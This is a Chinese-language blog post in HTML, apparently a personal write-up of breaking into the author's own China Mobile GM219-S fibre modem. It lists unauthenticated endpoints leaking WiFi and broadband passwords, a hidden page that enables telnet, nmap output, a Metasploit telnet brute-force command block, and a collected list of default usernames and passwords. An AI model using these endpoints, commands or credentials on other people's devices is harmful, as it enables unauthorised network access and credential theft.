<!DOCTYPE html> <html lang="en"> <head> <meta charset="utf-8"> <meta http-equiv="X-UA-Compatible" content="IE=edge"> <meta name="viewport" content="width=device-width, initial-scale=1" /> <title>记一次移动光猫（GM219-S）安全测试 · Chen's Blog</title> <meta name="description" content="前言"> <meta name="keywords" content="前言"> <link rel="icon" href="http://localhost:4000/assets/favicon.png"> <link rel="apple-touch-icon" href="http://localhost:4000/assets/touch-icon.png"> <link rel="stylesheet" href="http://localhost:4000/assets/core.css"> <link rel="canonical" href="http://localhost:4000/archives/2019-03-12/1"> <link rel="alternate" type="application/atom+xml" title="Chen's Blog" href="http://localhost:4000/feed.xml" /> <link href="/fancybox/source/jquery.fancybox.css?v=2.1.5" rel="stylesheet" media="all" /> <script> var _hmt = _hmt || []; (function() { var hm = document.createElement("script"); hm.src = "https://hm.baidu.com/hm.js?e4a42a371cc5994ee02b940034c29658"; var s = document.getElementsByTagName("script")[0]; s.parentNode.insertBefore(hm, s); })(); </script> <script> window.giscusThemeConfig = { light: "light_protanopia", dark: "dark_tritanopia" }; </script> <script src="/assets/js/theme.js"></script> </head> <body> <button class="theme-toggle" id="themeToggle" aria-label="Switch Theme"> <!-- 太阳图标 (在深色模式显示) --> <svg id="icon-sun" viewBox="0 0 24 24"> <path d="M12 7c-2.76 0-5 2.24-5 5s2.24 5 5 5 5-2.24 5-5-2.24-5-5-5zM2 13h2c.55 0 1-.45 1-1s-.45-1-1-1H2c-.55 0-1 .45-1 1s.45 1 1 1zm18 0h2c.55 0 1-.45 1-1s-.45-1-1-1h-2c-.55 0-1 .45-1 1s.45 1 1 1zM11 2v2c0 .55.45 1 1 1s1-.45 1-1V2c0-.55-.45-1-1-1s-1 .45-1 1zm0 18v2c0 .55.45 1 1 1s1-.45 1-1v-2c0-.55-.45-1-1-1s-1 .45-1 1zM5.99 4.58c-.39-.39-1.03-.39-1.41 0-.39.39-.39 1.03 0 1.41l1.06 1.06c.39.39 1.03.39 1.41 0s.39-1.03 0-1.41L5.99 4.58zm12.37 12.37c-.39-.39-1.03-.39-1.41 0-.39.39-.39 1.03 0 1.41l1.06 1.06c.39.39 1.03.39 1.41 0 .39-.39.39-1.03 0-1.41l-1.06-1.06zm1.06-10.96c.39-.39.39-1.03 0-1.41-.39-.39-1.03-.39-1.41 0l-1.06 1.06c-.39.39-.39 1.03 0 1.41s1.03.39 1.41 0l1.06-1.06zM7.05 18.36c.39-.39.39-1.03 0-1.41-.39-.39-1.03-.39-1.41 0l-1.06 1.06c-.39.39-.39 1.03 0 1.41s1.03.39 1.41 0l1.06-1.06z" /> </svg> <!-- 月亮图标 (在亮色模式显示) --> <svg id="icon-moon" viewBox="0 0 24 24" style="display: none"> <path d="M9.37,5.51C9.19,6.15,9.1,6.82,9.1,7.5c0,4.08,3.32,7.4,7.4,7.4c0.68,0,1.35-0.09,1.99-0.27C17.45,17.16,14.93,19,12,19 c-3.86,0-7-3.14-7-7C5,9.06,6.83,6.55,9.37,5.51z M12,3c-4.97,0-9,4.03-9,9s4.03,9,9,9s9-4.03,9-9c0-0.46-0.04-0.92-0.1-1.36 c-0.98,1.37-2.58,2.26-4.4,2.26c-2.98,0-5.4-2.42-5.4-5.4c0-1.81,0.89-3.42,2.26-4.4C12.92,3.04,12.46,3,12,3L12,3z" /> </svg> </button> <aside class="logo"> <a href="http://localhost:4000/"> <img src="/assets/avatar.jpg" class="logo-avatar"> </a> <span class="logo-prompt code">Back to Index</span> </aside> <article> <h1 class="title">EvilChen</h1> <div class="divider"></div> <center> <a href="https://github.com/gh0stkey" target="_blank">Github</a> | <a href="https://twitter.com/VulkeyChen" target="_blank">X (Twitter)</a> | <a href="/about" target="_blank">About</a> | <a href="/friends" target="_blank">Friends</a> </center> <div class="divider"></div> </article> <div id="content"> <article> <div class="center"> <h1 class="title">记一次移动光猫（GM219-S）安全测试</h1> <time class="code">March 12, 2019</time> </div> <div class="divider"></div> <iframe frameborder="no" border="0" marginwidth="0" marginheight="0" width="330" height="86" src="//music.163.com/outchain/player?type=2&auto=1&id=1348044876&height=66"></iframe> <h1 id="前言">前言</h1> <p>过个年，WiFi密码忘记了…光猫管理密码也忘记了（这个光猫也不支持物理按钮重置设置），但是手机还连着WiFi，正规操作找回不了密码，那就用咱们测试的思维来试试PWN掉这个路由器。</p> <h1 id="过程">过程</h1> <h2 id="未授权获取wifi连接密码">未授权获取WiFi连接密码</h2> <p>还好之前没闲着，发现管理的几个未授权访问的接口如下:</p> <p>获取宽带账号密码: <code class="language-plaintext highlighter-rouge">/GET_USER_WAN_PPP_INFO.json</code></p> <p>获取 WLAN 连接信息: <code class="language-plaintext highlighter-rouge">/GET_WLAN_LINK_INFO.json</code></p> <p>获取 DHCP 信息: <code class="language-plaintext highlighter-rouge">/GET_NET_DHCP_INFO.json</code></p> <p>手机访问 <code class="language-plaintext highlighter-rouge">http://192.168.1.1/GET_WLAN_LINK_INFO.json</code> ，获取密码：xxx，电脑连接登录</p> <h2 id="信息收集">信息收集</h2> <h3 id="端口收集结果">端口收集结果</h3> <div class="language-shell highlighter-rouge"><div class="highlight"><pre class="highlight"><code>Scanning promote.cache-dns.local <span class="o">(</span>192.168.1.1<span class="o">)</span> <span class="o">[</span>1080 ports]
Discovered open port 80/tcp on 192.168.1.1
Discovered open port 8080/tcp on 192.168.1.1
</code></pre></div></div> <h3 id="目录扫描结果">目录扫描结果</h3> <p>获得的一些目录：</p> <div class="language-shell highlighter-rouge"><div class="highlight"><pre class="highlight"><code>/login.html
/login.asp
/index.asp
/telnet.asp
/upgrade.asp
...
</code></pre></div></div> <h2 id="突破口">突破口</h2> <p>在目录扫描的时候，发现<code class="language-plaintext highlighter-rouge">/telnet.asp</code> -&gt; 跳转到 <code class="language-plaintext highlighter-rouge">/cgi-bin/telnet.asp</code> 如下图所示界面：</p> <p><img src="/images/cmcc-pentest/open_telnet.png" alt="open_telnet" /></p> <p>这个功能可以开启光猫的<code class="language-plaintext highlighter-rouge">telnet</code>服务，先开启，然后再使用Nmap扫描下端口：</p> <div class="language-shell highlighter-rouge"><div class="highlight"><pre class="highlight"><code>Scanning promote.cache-dns.local <span class="o">(</span>192.168.1.1<span class="o">)</span> <span class="o">[</span>1080 ports]
Discovered open port 8080/tcp on 192.168.1.1
Discovered open port 80/tcp on 192.168.1.1
Discovered open port 8023/tcp on 192.168.1.1
</code></pre></div></div> <p>发现多了个8023端口，其对应的服务果然是telnet：</p> <div class="language-shell highlighter-rouge"><div class="highlight"><pre class="highlight"><code>8023/tcp open  telnet
| fingerprint-strings:
|   GenericLines:
|     Star-Net Broadband Router
|     Login:
|     Password:
|   GetRequest:
|     Star-Net Broadband Router
|     Login: GET / HTTP/1.0
|     Password:
|   Help:
|     HELP
|     Star-Net Broadband Router
|     Login: Password:
|   NCP:
|     Star-Net Broadband Router
|     Login: DmdT^@^@^@
|     ^@^@^@^A^@^@^@^@^@
|   NULL:
|     Star-Net Broadband Router
|     Login:
|   RPCCheck:
|     Star-Net Broadband Router
|     Login:
|     ^@^@<span class="o">(</span>r
|   SIPOptions:
|     Star-Net Broadband Router
|     Login: OPTIONS sip:nm SIP/2.0
|     Via: SIP/2.0/TCP nm<span class="p">;</span><span class="nv">branch</span><span class="o">=</span>foo
|     From: &lt;sip:nm@nm&gt;<span class="p">;</span><span class="nv">tag</span><span class="o">=</span>root
|     &lt;sip:nm2@nm2&gt;
|     Call-ID: 50000
|     CSeq: 42 OPTIONS
|     Max-Forwards: 70
|     Content-Length: 0
|     Contact: &lt;sip:nm@nm&gt;
|     Accept: application/sdp
|     Password:
|   tn3270:
|     ^@IBM-3279-4-E
|     ^YStar-Net Broadband Router
|_    Login:
</code></pre></div></div> <p>telnet开启，爆破一波走起。（Caimima生成个密码口令）</p> <p><img src="/images/cmcc-pentest/caimima.png" alt="caimima" /></p> <p>试了nmap貌似没啥用，开个msfconsole来爆破：</p> <div class="language-shell highlighter-rouge"><div class="highlight"><pre class="highlight"><code>use auxiliary/scanner/telnet/telnet_login
<span class="nb">set </span>RHOSTS 192.168.1.1 <span class="c">#设置模板</span>
<span class="nb">set </span>RPORT 8023 <span class="c">#设置端口</span>
<span class="nb">set </span>USER_FILE /root/user.txt <span class="c">#设置用户字典</span>
<span class="nb">set </span>PASS_FILE /root/pass.txt <span class="c">#设置密码字典</span>
exploit 192.168.1.1 <span class="c">#启动</span>
</code></pre></div></div> <p>幸运的是爆破出来了，是组合弱口令：</p> <p><img src="/images/cmcc-pentest/telnet_brute.png" alt="telnet_brute" /></p> <h2 id="获取密码">获取密码</h2> <p>运行<code class="language-plaintext highlighter-rouge">telnet 192.168.1.1 8023</code>输入账号密码进去，执行<code class="language-plaintext highlighter-rouge">sh</code>发现可以直接进入shell：</p> <p><img src="/images/cmcc-pentest/telnet_shell.png" alt="telnet_shell" /></p> <p>接下来就是找密码到处瞎翻（没有PWN路由器的经验，很难受），执行 <code class="language-plaintext highlighter-rouge">ls -a -l</code> 发现有软链接，很多指向了<code class="language-plaintext highlighter-rouge">/tmp</code>目录：</p> <p><img src="/images/cmcc-pentest/ls.png" alt="ls" /></p> <p>于是进入<code class="language-plaintext highlighter-rouge">/tmp</code>目录，到处翻腾：</p> <p><img src="/images/cmcc-pentest/tmp.png" alt="tmp" /></p> <p>利用这几个关键词看看是否有文件中包含了：<code class="language-plaintext highlighter-rouge">admin</code>、<code class="language-plaintext highlighter-rouge">CMCC</code>(中国移动)、<code class="language-plaintext highlighter-rouge">password</code>、<code class="language-plaintext highlighter-rouge">user</code></p> <p>e.g. <code class="language-plaintext highlighter-rouge">grep 'admin' ./*</code>，等了老半天了，发现<code class="language-plaintext highlighter-rouge">/tmp/ctromfile.cfg</code>文件内有点东西：</p> <p><img src="/images/cmcc-pentest/admin.png" alt="admin" /></p> <p>复制密码登录，怼进去：</p> <p><img src="/images/cmcc-pentest/cmccadmin.png" alt="cmccadmin" /></p> <h2 id="信息整合">信息整合</h2> <p>做完测试并针对测试过程的信息进行整合，最后形成字典以便后面再次遇到～</p> <ul> <li> <p>通过读配置文件获取的一系列用户名、密码：<code class="language-plaintext highlighter-rouge">9vvrr、admin、aDm8H%MdA、CMCCAdmin、telnetuser、user</code></p> </li> <li>文件、目录路径： <ul> <li><code class="language-plaintext highlighter-rouge">/GET_USER_WAN_PPP_INFO.json</code></li> <li><code class="language-plaintext highlighter-rouge">/GET_WLAN_LINK_INFO.json</code></li> <li><code class="language-plaintext highlighter-rouge">/GET_NET_DHCP_INFO.json</code></li> <li><code class="language-plaintext highlighter-rouge">/telnet.asp</code></li> <li><code class="language-plaintext highlighter-rouge">/index.asp</code></li> <li><code class="language-plaintext highlighter-rouge">/user.html</code></li> <li><code class="language-plaintext highlighter-rouge">/upgrade.asp</code></li> <li><code class="language-plaintext highlighter-rouge">/cgi-bin/</code></li> <li><code class="language-plaintext highlighter-rouge">/content.asp</code></li> </ul> </li> <li>指纹特征： <ul> <li>标题：<code class="language-plaintext highlighter-rouge">HGU LOGIN</code></li> <li>图片：<code class="language-plaintext highlighter-rouge">/webstyle/images/login-mobile-qrcode-anhui.png -&gt; 23cb4f5e63e0cd47f8788a6ca3558eab</code></li> <li>JS：<code class="language-plaintext highlighter-rouge">/webstyle/js/br_login_nc.js</code></li> </ul> </li> </ul> <h1 id="结尾">结尾</h1> <p>最后我只是默默的把user用户密码改了一下～</p> </article> <div class="page-navigation code"> <a class="next" href="http://localhost:4000/archives/2019-03-20/1" title="NEXT: 浅谈WebSocket跨域劫持漏洞(CSWSH)">&lt;&lt;</a> <span> &middot; </span> <a class="home" href="http://localhost:4000/" title="Back to Index">INDEX</a> <span> &middot; </span> <a class="prev" href="http://localhost:4000/archives/2019-01-23/1" title="PREV: 我为何在博客模板留后门">&gt;&gt;</a> </div> <div class="comments"> <div id="giscus-container" class="giscus"></div> <script> (function() { const getTheme = () => { try { const savedTheme = localStorage.getItem('theme'); if (savedTheme) { return savedTheme; } } catch (e) {} if (window.matchMedia && window.matchMedia('(prefers-color-scheme: dark)').matches) { return 'dark'; } const hour = new Date().getHours(); return (hour >= 6 && hour < 18) ? 'light' : 'dark'; }; const theme = getTheme(); const giscusTheme = theme === 'dark' ? 'dark_tritanopia' : 'light_protanopia'; const script = document.createElement('script'); script.src = "https://giscus.app/client.js"; script.setAttribute("data-repo", "gh0stkey/gh0stkey.github.io"); script.setAttribute("data-repo-id", "MDEwOlJlcG9zaXRvcnkzODc5NzEyMzU="); script.setAttribute("data-category", "Announcements"); script.setAttribute("data-category-id", "DIC_kwDOFx_4o84CyCUA"); script.setAttribute("data-mapping", "title"); script.setAttribute("data-strict", "0"); script.setAttribute("data-reactions-enabled", "0"); script.setAttribute("data-emit-metadata", "0"); script.setAttribute("data-input-position", "top"); script.setAttribute("data-lang", "zh-CN"); script.setAttribute("data-theme", giscusTheme); script.setAttribute("crossorigin", "anonymous"); script.async = true; document.getElementById('giscus-container').appendChild(script); })(); </script> </div> </div> <div class="footer"> <span class="block">&lt;/&gt; Copyright &copy; Chen's Blog (GH0ST.CN) 2016-2021</span> </div> <script src="/fancybox/lib/jquery-1.10.2.min.js"></script> <script type="text/javascript" src="/fancybox/source/jquery.fancybox.pack.js?v=2.1.5"></script> <script> $(document).ready(function() { $("article img").each(function() { var strA = "<a style='text-decoration: none;' id='imgid' href='" + this.src + "'></a>"; $(this).wrapAll(strA); }); $(".block").html("&lt;/&gt; Copyright &copy; Chen's Blog (GH0ST.CN) 2016-" + (new Date()).getFullYear()); }); $("#imgid").fancybox({ openEffect : 'elastic', closeEffect : 'elastic', }); </script> </body> </html>
